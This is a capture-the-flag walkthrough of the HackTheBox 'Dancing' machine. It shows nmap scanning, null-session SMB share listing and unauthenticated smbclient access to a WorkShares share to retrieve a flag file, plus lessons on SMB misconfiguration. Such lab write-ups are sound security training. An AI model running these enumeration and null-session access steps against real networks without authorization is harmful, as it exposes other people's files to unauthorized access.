# Dancing — HackTheBox Starting Point

**Machine:** Dancing
**Difficulty:** Very Easy
**OS:** Windows
**Category:** Starting Point
**Pwned:** 27 Jul 2026
**XP Earned:** 150

---

## Summary

Dancing introduces SMB enumeration and unauthenticated share access. Nmap reveals SMB running on port 445, smbclient lists available shares without credentials, and the flag is retrieved directly from an openly accessible WorkShares share. The machine demonstrates one of the most common Windows network misconfigurations — SMB shares with no authentication required.

---

## Methodology

### 1. VPN Connection

```bash
sudo openvpn starting_point.ovpn
```

### 2. Host Discovery

```bash
ping -c 4 <target IP>
```

Target responded — host is alive.

### 3. Enumeration — Nmap Scan

```bash
sudo nmap -sV <target IP>
```

**Relevant output:**

```
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
```

**Findings:**

- Port 445 — SMB (Server Message Block) open
- Service: microsoft-ds — Windows SMB implementation
- Target is a Windows machine

SMB is the Windows file and printer sharing protocol. Port 445 is the modern SMB port (direct over TCP), replacing the older NetBIOS ports 137–139. Finding SMB open immediately signals potential share enumeration and credential attacks.

### 4. SMB Share Enumeration

Listed available SMB shares on the target without providing credentials (`-N` flag = no password):

```bash
smbclient -L //<target IP> -N
```

**Output:**

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

**Shares identified:**

- `ADMIN$` — administrative share, typically requires admin credentials
- `C$` — root of C drive, typically requires admin credentials
- `IPC$` — inter-process communication, used for named pipes
- `WorkShares` — non-default share with no comment — the target

`WorkShares` stood out as a custom share with no description. Custom shares are often misconfigured.

### 5. Foothold — Unauthenticated Share Access

Connected to the WorkShares share without credentials:

```bash
smbclient //<target IP>/WorkShares -N
```

**Response:**

```
Try "help" to get a list of possible commands.
smb: \>
```

Access granted with no authentication required.

### 6. Flag Retrieval

Listed contents of the share:

```bash
smb: \> ls
```

Located `flag.txt`. Downloaded it to the local machine:

```bash
smb: \> get flag.txt
```

Exited the SMB session and read the flag:

```bash
exit
cat flag.txt
```

**Flag:** `<flag value>`

---

## Vulnerability Summary

| Vulnerability                               | Severity | Description                                                                                             |
| ------------------------------------------- | -------- | ------------------------------------------------------------------------------------------------------- |
| SMB share accessible without authentication | High     | WorkShares share allows null session access — any user can connect and browse files without credentials |
| Sensitive file in accessible share          | High     | Flag stored in an unauthenticated network share                                                         |
| SMB enabled and internet-facing             | Medium   | SMB should never be exposed to the internet — it is an internal network protocol                        |

---

## SMB Key Concepts

**SMB (Server Message Block)** is a network protocol used for file sharing, printer sharing, and inter-process communication in Windows environments. It operates over:

- **Port 445** — direct TCP (modern)
- **Ports 137–139** — NetBIOS over TCP (legacy)

**Null session** — connecting to SMB without providing credentials. Allowed on some shares by misconfiguration. Historically a major Windows vulnerability; still appears in poorly configured environments.

**Default administrative shares:**
| Share | Purpose |
|-------|---------|
| `ADMIN$` | Maps to Windows installation directory |
| `C$` | Maps to root of C: drive |
| `IPC$` | Inter-process communication — named pipes |

These require administrator credentials. Custom shares like `WorkShares` are configured by administrators and may have weaker access controls.

---

## Key Lessons

- **Always enumerate SMB shares** — `smbclient -L` with `-N` (no password) is the first check. Null session access to non-default shares is a common misconfiguration
- **Custom shares are higher risk than default shares** — `ADMIN$` and `C$` require admin credentials by default; custom shares depend entirely on how they were configured
- **SMB should never be internet-facing** — EternalBlue (MS17-010) exploited SMB to cause global ransomware outbreaks. Port 445 should be blocked at the perimeter firewall
- **`-N` flag is the null session flag** — always try it first before attempting credential attacks
- **SMB enumeration tools** — `smbclient` for manual access, `enum4linux` for automated enumeration, Nmap SMB scripts for vulnerability checking

---

## Tools Used

| Tool      | Purpose                                  |
| --------- | ---------------------------------------- |
| OpenVPN   | VPN connection to HTB network            |
| ping      | Host discovery                           |
| Nmap      | Port scanning and service detection      |
| smbclient | SMB share enumeration and file retrieval |

---

_HackTheBox Starting Point — Dancing | Pwned 27 Jul 2026_
